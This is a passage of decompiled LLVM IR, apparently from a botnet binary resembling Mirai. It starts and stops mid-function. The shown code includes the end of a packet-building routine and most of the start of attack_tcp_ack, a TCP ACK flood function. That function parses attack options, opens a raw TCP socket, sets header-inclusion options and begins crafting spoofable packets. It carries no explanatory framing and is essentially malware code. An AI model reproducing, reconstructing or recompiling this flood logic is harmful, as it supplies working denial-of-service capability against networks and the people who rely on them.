  %v1_9ccc = add i32 %v0_9ccc, 13
  %v2_9ccc = inttoptr i32 %v1_9ccc to i8*
  %v3_9ccc = load i8, i8* %v2_9ccc, align 1
  %v4_9ccc = zext i8 %v3_9ccc to i32
  store i32 %v4_9ccc, i32* %r2.global-to-local, align 4
  %v0_9cd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cd0 = add i32 %v0_9cd0, 4
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* %r1.global-to-local, align 4
  %v1_9cd4 = add i32 %v0_9cd0, 14
  %v2_9cd4 = inttoptr i32 %v1_9cd4 to i16*
  %v3_9cd4 = load i16, i16* %v2_9cd4, align 2
  %v4_9cd4 = zext i16 %v3_9cd4 to i32
  store i32 %v4_9cd4, i32* %r3.global-to-local, align 4
  %v1_9cd8 = or i32 %v4_9ccc, 1
  store i32 %v1_9cd8, i32* %r2.global-to-local, align 4
  %v3_9cdc = add i32 %v0_9ccc, 2
  %v4_9cdc = inttoptr i32 %v3_9cdc to i16*
  store i16 %v3_9cd4, i16* %v4_9cdc, align 2
  %v0_9ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9ce0 = trunc i32 %v0_9ce0 to i8
  %v2_9ce0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9ce0 = add i32 %v2_9ce0, 13
  %v4_9ce0 = inttoptr i32 %v3_9ce0 to i8*
  store i8 %v1_9ce0, i8* %v4_9ce0, align 1
  %v0_9ce4 = load i32, i32* %ip.global-to-local, align 4
  %v1_9ce4 = add i32 %v0_9ce4, 12
  %v2_9ce4 = inttoptr i32 %v1_9ce4 to i8*
  %v3_9ce4 = load i8, i8* %v2_9ce4, align 1
  %v4_9ce4 = zext i8 %v3_9ce4 to i32
  store i32 %v4_9ce4, i32* %r3.global-to-local, align 4
  %v1_9ce8 = add i32 %v0_9ce4, 13
  %v2_9ce8 = inttoptr i32 %v1_9ce8 to i8*
  %v3_9ce8 = load i8, i8* %v2_9ce8, align 1
  %v4_9ce8 = zext i8 %v3_9ce8 to i32
  %tmp103 = urem i8 %v3_9ce4, 16
  %v1_9cec = zext i8 %tmp103 to i32
  %v1_9cf0 = or i32 %v1_9cec, 128
  store i32 %v1_9cf0, i32* %r3.global-to-local, align 4
  %v1_9cf4 = or i32 %v4_9ce8, 16
  store i32 %v1_9cf4, i32* %r2.global-to-local, align 4
  %v0_9cf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_9cf8 = add i32 %v0_9ce4, 8
  %v3_9cf8 = inttoptr i32 %v2_9cf8 to i32*
  store i32 %v0_9cf8, i32* %v3_9cf8, align 4
  %v0_9cfc = load i32, i32* %r3.global-to-local, align 4
  %v1_9cfc = trunc i32 %v0_9cfc to i8
  %v2_9cfc = load i32, i32* %ip.global-to-local, align 4
  %v3_9cfc = add i32 %v2_9cfc, 12
  %v4_9cfc = inttoptr i32 %v3_9cfc to i8*
  store i8 %v1_9cfc, i8* %v4_9cfc, align 1
  %v0_9d00 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v0_9d00 to i8
  %v2_9d00 = load i32, i32* %ip.global-to-local, align 4
  %v3_9d00 = add i32 %v2_9d00, 13
  %v4_9d00 = inttoptr i32 %v3_9d00 to i8*
  store i8 %v1_9d00, i8* %v4_9d00, align 1
  %v0_9d04 = call i32 @rand_next()
  %v1_9d04 = trunc i32 %v0_9d04 to i16
  store i32 %v0_9d04, i32* %r0.global-to-local, align 4
  store i32 %v0_9c78, i32* %lr.global-to-local, align 4
  store i32 %v1_96ac, i32* %r1.global-to-local, align 4
  %v1_9d10 = add i32 %v0_9c78, 13
  %v2_9d10 = inttoptr i32 %v1_9d10 to i8*
  %v3_9d10 = load i8, i8* %v2_9d10, align 1
  %v4_9d10 = zext i8 %v3_9d10 to i32
  store i32 %v1_9d14, i32* %r2.global-to-local, align 4
  %v1_9d18 = and i32 %v4_9d10, 223
  %v5_9d1c = or i32 %v1_9d18, %v4_9d1c
  store i32 %v5_9d1c, i32* %r3.global-to-local, align 4
  %v1_9d20 = trunc i32 %v5_9d1c to i8
  store i8 %v1_9d20, i8* %v2_9d10, align 1
  store i32 %v1_96cc, i32* %ip.global-to-local, align 4
  %v0_9d28 = load i32, i32* %lr.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d28, 13
  %v2_9d28 = inttoptr i32 %v1_9d28 to i8*
  %v3_9d28 = load i8, i8* %v2_9d28, align 1
  %v4_9d28 = zext i8 %v3_9d28 to i32
  store i32 %v1_9d2c, i32* %r3.global-to-local, align 4
  %v1_9d30 = and i32 %v4_9d28, 239
  %v5_9d34 = or i32 %v1_9d30, %v4_9d34
  store i32 %v5_9d34, i32* %r2.global-to-local, align 4
  %v1_9d38 = trunc i32 %v5_9d34 to i8
  store i8 %v1_9d38, i8* %v2_9d28, align 1
  %v0_9d3c = load i32, i32* %lr.global-to-local, align 4
  %v1_9d3c = add i32 %v0_9d3c, 13
  %v2_9d3c = inttoptr i32 %v1_9d3c to i8*
  %v3_9d3c = load i8, i8* %v2_9d3c, align 1
  %v4_9d3c = zext i8 %v3_9d3c to i32
  store i32 %v1_96ec, i32* %lr.global-to-local, align 4
  store i32 %v0_9c78, i32* %r1.global-to-local, align 4
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  %v1_9d4c = and i32 %v4_9d3c, 247
  %v5_9d50 = or i32 %v1_9d4c, %v4_9d50
  store i32 %v5_9d50, i32* %r3.global-to-local, align 4
  %v1_9d54 = trunc i32 %v5_9d50 to i8
  store i8 %v1_9d54, i8* %v2_9d10, align 1
  store i32 %v1_970c, i32* %ip.global-to-local, align 4
  %v0_9d5c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d5c = add i32 %v0_9d5c, 13
  %v2_9d5c = inttoptr i32 %v1_9d5c to i8*
  %v3_9d5c = load i8, i8* %v2_9d5c, align 1
  %v4_9d5c = zext i8 %v3_9d5c to i32
  store i32 %v1_9d60, i32* %r3.global-to-local, align 4
  %v1_9d64 = and i32 %v4_9d5c, 251
  %v5_9d68 = or i32 %v1_9d64, %v4_9d68
  store i32 %v5_9d68, i32* %r2.global-to-local, align 4
  %v1_9d6c = trunc i32 %v5_9d68 to i8
  store i8 %v1_9d6c, i8* %v2_9d5c, align 1
  store i32 %v1_972c, i32* @lr, align 4
  %v0_9d74 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v0_9d74, 13
  %v2_9d74 = inttoptr i32 %v1_9d74 to i8*
  %v3_9d74 = load i8, i8* %v2_9d74, align 1
  %v4_9d74 = zext i8 %v3_9d74 to i32
  store i32 %v1_9d78, i32* %r2.global-to-local, align 4
  %v1_9d7c = and i32 %v4_9d74, 253
  %v4_9d80 = or i32 %v1_9d7c, %v3_9d80
  store i32 %v4_9d80, i32* %r3.global-to-local, align 4
  %v1_9d84 = trunc i32 %v4_9d80 to i8
  store i8 %v1_9d84, i8* %v2_9d74, align 1
  %v0_9d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d88 = add i32 %v0_9d88, 13
  %v2_9d88 = inttoptr i32 %v1_9d88 to i8*
  %v3_9d88 = load i8, i8* %v2_9d88, align 1
  %v4_9d88 = zext i8 %v3_9d88 to i32
  %v1_9d90 = and i32 %v4_9d88, 254
  %v2_9d98 = or i32 %v1_9d90, %v1_9d94
  store i32 %v2_9d98, i32* %r3.global-to-local, align 4
  store i32 %v0_9c78, i32* %r2.global-to-local, align 4
  %v1_9da0 = trunc i32 %v2_9d98 to i8
  store i8 %v1_9da0, i8* %v2_9d10, align 1
  %v3_9da4 = load i32, i32* %r2.global-to-local, align 4
  %v4_9da4 = add i32 %v3_9da4, 14
  %v5_9da4 = inttoptr i32 %v4_9da4 to i16*
  store i16 %v1_9d04, i16* %v5_9da4, align 2
  store i32 %v6_9764, i32* %r1.global-to-local, align 4
  %v0_9dac = load i32, i32* @r4, align 4
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = call i32 @rand_alphastr(i32 %v0_9dac, i32 %v6_9764)
  store i32 %v2_9db0, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %ip.global-to-local, align 4
  %v2_9dbc = load i32, i32* @r4, align 4
  %v4_9dbc = add i32 %v2_9dbc, %v6_9764
  %v5_9dbc = inttoptr i32 %v4_9dbc to i8*
  store i8 0, i8* %v5_9dbc, align 1
  %v3_9dc0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_9dc8 = add i32 %v3_9dc0, 1
  store i32 %v1_9dc8, i32* @r3, align 4
  store i32 %v1_9dc8, i32* %stack_var_-44, align 4
  %v5_9dd4 = icmp slt i32 %v1_9dc8, %arg2
  br i1 %v5_9dd4, label %dec_label_pc_97fc.outer, label %dec_label_pc_9988.preheader

; uselistorder directives
  uselistorder i32 %v1_9dc8, { 1, 0, 2 }
  uselistorder i8* %v2_9d10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_9d04, { 1, 0 }
  uselistorder i32 %v0_9c78, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v5_9bac, { 1, 0 }
  uselistorder i32 %v2_9b70, { 1, 2, 0 }
  uselistorder i32 %v0_9b50, { 1, 0 }
  uselistorder i32 %v0_9b0c, { 1, 2, 0, 3 }
  uselistorder i32 %v7_9aa0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_9a88, { 1, 2, 0, 3 }
  uselistorder i32 %v5_9a50, { 1, 0 }
  uselistorder i32 %v4_9a40, { 1, 0 }
  uselistorder i32 %v3_9a0c, { 1, 0 }
  uselistorder i32 %v3_99ec, { 3, 2, 0, 1 }
  uselistorder i32 %v2_99d8, { 1, 0 }
  uselistorder i32 %v3_99b0, { 1, 0 }
  uselistorder i32 %v1_99a4, { 2, 0, 1 }
  uselistorder i32 %v1_9978, { 1, 0, 2 }
  uselistorder i32 %v3_9960, { 0, 2, 3, 1 }
  uselistorder i32 %v4_9928, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_986c, { 1, 0, 2 }
  uselistorder i32 %v0_9b90, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_985c, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v3_9808, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_9d78, { 1, 0 }
  uselistorder i32 %v1_9d60, { 1, 0 }
  uselistorder i32 %v1_9d2c, { 1, 0 }
  uselistorder i32 %v3_9920, { 1, 0 }
  uselistorder i32 %v1_9d48, { 1, 0 }
  uselistorder i32 %v1_9d14, { 1, 0 }
  uselistorder i32 %v4_9c2c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_9bec, { 2, 0, 1 }
  uselistorder i32 %v1_9938, { 1, 0 }
  uselistorder i32 %v4_9934, { 2, 0, 1 }
  uselistorder i32 %v2_9840, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_97f4, { 1, 0 }
  uselistorder i32 %v0_97e4, { 1, 0 }
  uselistorder i32 %v3_97a8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_9794, { 1, 0 }
  uselistorder i32 %v1_9784, { 2, 1, 0 }
  uselistorder i32 %v6_9764, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_974c, { 1, 0 }
  uselistorder i32 %v1_972c, { 1, 2, 0 }
  uselistorder i32 %v1_970c, { 1, 2, 0 }
  uselistorder i32 %v1_96ec, { 1, 2, 0 }
  uselistorder i32 %v1_96cc, { 1, 2, 0 }
  uselistorder i32 %v1_96ac, { 1, 2, 0 }
  uselistorder i32 %v6_9688, { 1, 0 }
  uselistorder i32 %v1_9670, { 1, 2, 0 }
  uselistorder i32 %v6_9644, { 1, 2, 0 }
  uselistorder i32 %v6_9608, { 1, 2, 0 }
  uselistorder i32 %v2_95f0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_95e0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 44, 45, 29, 30, 31, 32, 33, 34, 35, 36, 37, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 27, 28, 29, 30, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 22, 49, 23, 25, 24, 26, 28, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 15, 17, 19, 18, 22, 20, 32, 21, 23, 25, 24, 35, 33, 34, 36, 37, 38, 40, 41, 39, 42, 44, 43, 46, 45, 49, 48, 47, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 29, 30, 31 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_9aec, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_9ab8, { 1, 0 }
  uselistorder label %dec_label_pc_99c8, { 1, 0 }
  uselistorder label %dec_label_pc_9988, { 1, 0 }
  uselistorder label %dec_label_pc_98b4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9888, { 1, 0 }
  uselistorder label %dec_label_pc_9864, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_9818, { 1, 0 }
  uselistorder label %dec_label_pc_97fc, { 1, 0 }
  uselistorder label %dec_label_pc_97fc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_9de0 = load i32, i32* @sb, align 4
  %v24_9de0 = load i32, i32* @fp, align 4
  %v27_9de0 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_9e0c = call i32 @calloc(i32 %arg2, i32 4)
  %v0_9e10 = load i32, i32* @r4, align 4
  store i32 %v0_9e10, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_9e1c = load i32, i32* @sl, align 4
  store i32 %v0_9e1c, i32* %r3.global-to-local, align 4
  %v0_9e20 = load i32, i32* @r5, align 4
  store i32 %v0_9e20, i32* %r0.global-to-local, align 4
  %v5_9e24 = inttoptr i32 %v0_9e10 to i32*
  %v6_9e24 = call i32 @attack_get_opt_int(i32 %v0_9e20, i32* %v5_9e24, i32 2, i32 %v0_9e1c, i32 %v2_9e0c)
  %v1_9e30 = urem i32 %v6_9e24, 256
  store i32 %v1_9e30, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9e3c = load i32, i32* @r4, align 4
  store i32 %v0_9e3c, i32* %r1.global-to-local, align 4
  %v0_9e40 = load i32, i32* @r5, align 4
  store i32 %v0_9e40, i32* %r0.global-to-local, align 4
  %v5_9e44 = trunc i32 %v6_9e24 to i8
  %v6_9e48 = inttoptr i32 %v0_9e3c to i32*
  %v7_9e48 = call i32 @attack_get_opt_int(i32 %v0_9e40, i32* %v6_9e48, i32 3, i32 65535, i32 %v6_9e24)
  %v0_9e4c = load i32, i32* @r4, align 4
  store i32 %v0_9e4c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_9e5c = load i32, i32* @r5, align 4
  store i32 %v0_9e5c, i32* %r0.global-to-local, align 4
  %v5_9e60 = inttoptr i32 %v0_9e4c to i32*
  %v6_9e60 = call i32 @attack_get_opt_int(i32 %v0_9e5c, i32* %v5_9e60, i32 4, i32 64, i32 %v7_9e48)
  %v1_9e68 = urem i32 %v6_9e60, 256
  store i32 %v1_9e68, i32* %ip.global-to-local, align 4
  %v0_9e6c = load i32, i32* @r4, align 4
  store i32 %v0_9e6c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_9e74 = load i32, i32* @sl, align 4
  store i32 %v0_9e74, i32* %r3.global-to-local, align 4
  %v0_9e78 = load i32, i32* @r5, align 4
  store i32 %v0_9e78, i32* %r0.global-to-local, align 4
  %v6_9e80 = inttoptr i32 %v0_9e6c to i32*
  %v7_9e80 = call i32 @attack_get_opt_int(i32 %v0_9e78, i32* %v6_9e80, i32 5, i32 %v0_9e74, i32 %v1_9e68)
  %v1_9e8c = urem i32 %v7_9e80, 256
  store i32 %v1_9e8c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r4, align 4
  store i32 %v0_9e98, i32* %r1.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r5, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v5_9ea4 = inttoptr i32 %v0_9e98 to i32*
  %v6_9ea4 = call i32 @attack_get_opt_int(i32 %v0_9e9c, i32* %v5_9ea4, i32 6, i32 65535, i32 %v1_9e8c)
  %v0_9eac = load i32, i32* @r4, align 4
  store i32 %v0_9eac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9ea4, i32* %fp.global-to-local, align 4
  %v0_9ebc = load i32, i32* @r5, align 4
  store i32 %v0_9ebc, i32* %r0.global-to-local, align 4
  %v5_9ec0 = inttoptr i32 %v0_9eac to i32*
  %v6_9ec0 = call i32 @attack_get_opt_int(i32 %v0_9ebc, i32* %v5_9ec0, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9ec8 = load i32, i32* @r4, align 4
  store i32 %v0_9ec8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_9ec0, i32* %sb.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r5, align 4
  store i32 %v0_9ed8, i32* %r0.global-to-local, align 4
  %v5_9edc = inttoptr i32 %v0_9ec8 to i32*
  %v6_9edc = call i32 @attack_get_opt_int(i32 %v0_9ed8, i32* %v5_9edc, i32 16, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9ee8 = load i32, i32* @r4, align 4
  store i32 %v0_9ee8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  store i32 %v0_9ef4, i32* %r0.global-to-local, align 4
  %v5_9ef8 = inttoptr i32 %v0_9ee8 to i32*
  %v6_9ef8 = call i32 @attack_get_opt_int(i32 %v0_9ef4, i32* %v5_9ef8, i32 17, i32 65535, i32 %v6_9edc)
  %v0_9efc = load i32, i32* @r4, align 4
  store i32 %v0_9efc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_9f08 = load i32, i32* @sl, align 4
  store i32 %v0_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  store i32 %v0_9f0c, i32* %r0.global-to-local, align 4
  %v5_9f10 = inttoptr i32 %v0_9efc to i32*
  %v6_9f10 = call i32 @attack_get_opt_int(i32 %v0_9f0c, i32* %v5_9f10, i32 10, i32 %v0_9f08, i32 %v6_9ef8)
  %v0_9f14 = load i32, i32* @r4, align 4
  store i32 %v0_9f14, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9f24 = load i32, i32* @r5, align 4
  store i32 %v0_9f24, i32* %r0.global-to-local, align 4
  %v5_9f28 = inttoptr i32 %v0_9f14 to i32*
  %v6_9f28 = call i32 @attack_get_opt_int(i32 %v0_9f24, i32* %v5_9f28, i32 11, i32 1, i32 %v6_9f10)
  %v0_9f2c = load i32, i32* @r4, align 4
  store i32 %v0_9f2c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_9f38 = load i32, i32* @sl, align 4
  store i32 %v0_9f38, i32* %r3.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r5, align 4
  store i32 %v0_9f3c, i32* %r0.global-to-local, align 4
  %v5_9f40 = inttoptr i32 %v0_9f2c to i32*
  %v6_9f40 = call i32 @attack_get_opt_int(i32 %v0_9f3c, i32* %v5_9f40, i32 12, i32 %v0_9f38, i32 %v6_9f28)
  %v0_9f44 = load i32, i32* @r4, align 4
  store i32 %v0_9f44, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_9f50 = load i32, i32* @sl, align 4
  store i32 %v0_9f50, i32* %r3.global-to-local, align 4
  %v0_9f54 = load i32, i32* @r5, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v5_9f58 = inttoptr i32 %v0_9f44 to i32*
  %v6_9f58 = call i32 @attack_get_opt_int(i32 %v0_9f54, i32* %v5_9f58, i32 13, i32 %v0_9f50, i32 %v6_9f40)
  %v0_9f5c = load i32, i32* @r4, align 4
  store i32 %v0_9f5c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_9f68 = load i32, i32* @sl, align 4
  store i32 %v0_9f68, i32* %r3.global-to-local, align 4
  %v0_9f6c = load i32, i32* @r5, align 4
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  %v5_9f70 = inttoptr i32 %v0_9f5c to i32*
  %v6_9f70 = call i32 @attack_get_opt_int(i32 %v0_9f6c, i32* %v5_9f70, i32 14, i32 %v0_9f68, i32 %v6_9f58)
  %v0_9f74 = load i32, i32* @r4, align 4
  store i32 %v0_9f74, i32* %r1.global-to-local, align 4
  %v0_9f7c = load i32, i32* @sl, align 4
  store i32 %v0_9f7c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_9f84 = load i32, i32* @r5, align 4
  store i32 %v0_9f84, i32* %r0.global-to-local, align 4
  %v5_9f88 = inttoptr i32 %v0_9f74 to i32*
  %v6_9f88 = call i32 @attack_get_opt_int(i32 %v0_9f84, i32* %v5_9f88, i32 15, i32 %v0_9f7c, i32 %v6_9f70)
  %v0_9f8c = load i32, i32* @r4, align 4
  store i32 %v0_9f8c, i32* %r1.global-to-local, align 4
  %v0_9f94 = load i32, i32* @sl, align 4
  store i32 %v0_9f94, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_9f9c = load i32, i32* @r5, align 4
  store i32 %v0_9f9c, i32* %r0.global-to-local, align 4
  %v5_9fa0 = inttoptr i32 %v0_9f8c to i32*
  %v6_9fa0 = call i32 @attack_get_opt_int(i32 %v0_9f9c, i32* %v5_9fa0, i32 %v0_9f94, i32 512, i32 %v6_9f88)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9fac = load i32, i32* @r4, align 4
  store i32 %v0_9fac, i32* %r1.global-to-local, align 4
  store i32 %v6_9fa0, i32* @r8, align 4
  %v0_9fb4 = load i32, i32* @r5, align 4
  store i32 %v0_9fb4, i32* %r0.global-to-local, align 4
  %v5_9fb8 = inttoptr i32 %v0_9fac to i32*
  %v6_9fb8 = call i32 @attack_get_opt_int(i32 %v0_9fb4, i32* %v5_9fb8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_9fc4 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = urem i32 %v6_9fb8, 256
  store i32 %v1_9fc8, i32* %ip.global-to-local, align 4
  %v0_9fcc = load i32, i32* @r4, align 4
  store i32 %v0_9fcc, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_9fd4 = load i32, i32* @r5, align 4
  store i32 %v0_9fd4, i32* %r0.global-to-local, align 4
  %v5_9fdc = inttoptr i32 %v0_9fcc to i32*
  %v6_9fdc = call i32 @attack_get_opt_ip(i32 %v0_9fd4, i32* %v5_9fdc, i32 24, i32 %v2_9fc4, i32 %v1_9fc8)
  %v0_9fe4 = load i32, i32* @sl, align 4
  store i32 %v0_9fe4, i32* %r0.global-to-local, align 4
  %v1_9fe8 = inttoptr i32 %v0_9fe4 to i32*
  %v2_9fe8 = call i32 @__GI_time(i32* %v1_9fe8)
  %v1_9fec = load i32, i32* @r6, align 4
  %v2_9fec = add i32 %v1_9fec, %v2_9fe8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a000 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v7_a004 = icmp eq i32 %v3_a000, -1
  store i1 %v7_a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a004, label %dec_label_pc_a4e8, label %dec_label_pc_a010

dec_label_pc_a010:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a018 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a018, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a020 = load i32, i32* @sl, align 4
  store i32 %v0_a020, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a02c = call i32 @__GI_setsockopt(i32 %v3_a000, i32 %v0_a020, i32 3, i32 %v6_a018, i32 4)
  store i32 %v5_a02c, i32* %r0.global-to-local, align 4
  %v7_a030 = icmp eq i32 %v5_a02c, -1
  store i1 %v7_a030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a030, label %dec_label_pc_a4f4, label %dec_label_pc_a038

dec_label_pc_a038:                                ; preds = %dec_label_pc_a010
  store i32 %v7_9e48, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_a044 = load i32, i32* %fp.global-to-local, align 4
  %v0_a048 = load i32, i32* %sb.global-to-local, align 4
  %v3_a048 = mul i32 %v0_a048, 65536
  store i32 %v3_a048, i32* %sb.global-to-local, align 4
  %v3_a04c = urem i32 %v7_9e48, 65536
  store i32 %v3_a04c, i32* %r2.global-to-local, align 4
  %v3_a050 = urem i32 %v0_a044, 65536
  store i32 %v3_a050, i32* %r3.global-to-local, align 4
  %v3_a054 = urem i32 %v0_a048, 65536
  store i32 %v3_a054, i32* %ip.global-to-local, align 4
  %v2_a058 = icmp eq i32 %arg2, 0
  store i1 %v2_a058, i1* %cpsr_z.global-to-local, align 1
  %v0_a05c = load i32, i32* @sl, align 4
  store i32 %v0_a05c, i32* %stack_var_-44, align 4
  br i1 %v2_a058, label %dec_label_pc_a298.preheader, label %dec_label_pc_a070

dec_label_pc_a070:                                ; preds = %dec_label_pc_a038
  %v0_a080 = load i32, i32* @r8, align 4
  %v3_a080 = mul i32 %v0_a080, 65536
  %v1_a088 = add i32 %v3_a080, 2621440
  %tmp59 = mul i32 %v0_a044, 256
  %v3_a094 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_a048, 256
